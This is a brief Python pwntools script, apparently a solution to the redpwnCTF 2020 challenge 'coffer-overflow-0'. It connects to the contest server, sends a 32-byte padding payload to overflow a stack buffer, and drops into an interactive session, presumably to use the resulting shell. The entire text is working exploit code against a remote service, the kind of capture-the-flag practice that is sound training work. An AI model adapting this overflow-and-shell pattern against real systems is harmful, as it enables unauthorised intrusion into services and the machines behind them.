from pwn import *
r=remote("2020.redpwnc.tf",31199)
#r=process("./coffer-overflow-0")
pay=""
pay+='x'*0x20

r.sendline(pay)

r.interactive()
